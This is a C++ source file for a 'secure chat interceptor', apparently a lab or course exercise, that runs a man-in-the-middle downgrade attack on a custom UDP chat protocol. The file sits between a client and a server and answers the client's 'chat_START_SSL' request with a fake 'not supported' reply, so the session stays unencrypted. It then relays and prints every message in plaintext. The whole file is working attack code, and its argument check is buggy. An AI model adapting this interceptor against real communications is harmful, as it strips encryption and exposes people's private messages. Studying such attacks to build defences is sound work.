#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <typeinfo>
#include <string>
#include <cstring>

#define SERVER_PORT 9090
#define MAX_BUFFER_SIZE 1024

using namespace std;

string client_host_name, server_host_name;

void ssl_downgrade_attack(char * server_hostname){
        int reuse = 1;
        //initiaing fake server socket
        int fake_server_socket_descriptor = socket(AF_INET,SOCK_DGRAM,0);
        if(fake_server_socket_descriptor < 0){
                cout << "Fake Server Socket Creation Failure\n";
                exit(EXIT_FAILURE);  
        }
        setsockopt(fake_server_socket_descriptor, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));

        struct sockaddr_in fake_server_address, client_address;
        memset(&fake_server_address, 0, sizeof(fake_server_address));
        memset(&client_address, 0, sizeof(client_address));

        fake_server_address.sin_family = AF_INET;
        fake_server_address.sin_addr.s_addr = INADDR_ANY;
        fake_server_address.sin_port = htons(SERVER_PORT);

        if (bind(fake_server_socket_descriptor, (const struct sockaddr *)&fake_server_address, sizeof(fake_server_address)) < 0) {
                cout << "Fake Server Binding Failure with Client\n";
                exit(EXIT_FAILURE);
        }

        //initiating fake client socket
        int fake_client_socket_descriptor = socket(AF_INET,SOCK_DGRAM,0);
        if(fake_client_socket_descriptor < 0){
                cout << "Fake Client Socket Creation Failure\n";
                exit(EXIT_FAILURE);  
        }
        setsockopt(fake_client_socket_descriptor, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
        struct hostent *address;
        address = gethostbyname(server_hostname);
        string server_host_address = inet_ntoa(*(struct in_addr*)address->h_addr);
        struct sockaddr_in server_address;

        if ((fake_client_socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
                perror("socket creation failed\n");
                exit(EXIT_FAILURE);
        }

        memset(&server_address, 0, sizeof(server_address));
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(SERVER_PORT);
        server_address.sin_addr.s_addr = inet_addr(server_host_address.c_str());

        if(connect(fake_client_socket_descriptor,(struct sockaddr*) &server_address,sizeof(server_address))){
                cout << " Error in connecting socket from client";
                exit(0);
        }

        while(true){
                int received_message_len,len;
                string msg,ack;
                char buffer[MAX_BUFFER_SIZE];

                received_message_len = recvfrom(fake_server_socket_descriptor, (char *)buffer, MAX_BUFFER_SIZE-1, 0, (struct sockaddr *) &client_address, (socklen_t *)&len);
                buffer[received_message_len] = '\0';
                cout << "Client : " << buffer << " received from client.\n";
                if(strcmp(buffer,"chat_START_SSL")==0){
                        ack = "chat_START_SSL_NOT_SUPPORTED";
                        goto jump;
                }
                msg = buffer;
                sendto(fake_client_socket_descriptor, msg.c_str(), msg.length(), 0, (const struct sockaddr *) &server_address, sizeof(server_address));
                cout << "Forwarding message : " << msg << " to actual server.\n";
                if(msg=="chat_close"){
                        break;
                }

                memset(buffer, '\0', sizeof(buffer));
                received_message_len = recvfrom(fake_client_socket_descriptor, (char *)buffer, MAX_BUFFER_SIZE-1, 0, (struct sockaddr *) &server_address, (socklen_t *)&len);
                buffer[received_message_len] = '\0';
                cout << "Server : " << buffer << " received from server.\n";

                ack = buffer;
                jump:
                sendto(fake_server_socket_descriptor, ack.c_str(), ack.length(), 0, (const struct sockaddr *) &client_address, sizeof(client_address));
                cout << "Forwarding message : " << ack << " to actual client.\n";
                if(ack=="chat_close"){
                        break;
                }

        }
        close(fake_client_socket_descriptor);
        close(fake_server_socket_descriptor);
        cout << "\nInterceptor Closed\n\n";
}

int main(int argc, char* argv[])
{
        if(sizeof(argc) != 4 || argv[1][1] != 'd'){
                cout << "Usage: ./secure_chat_interceptor [OPTIONS] { client host name } { server host name } \n\n       OPTIONS := { -d[own_grade_attack] } \n";
                exit(EXIT_FAILURE);
        }
        else {
                client_host_name = argv[2];
                server_host_name = argv[3];
                ssl_downgrade_attack(argv[3]);  
        }
        return 0;
}
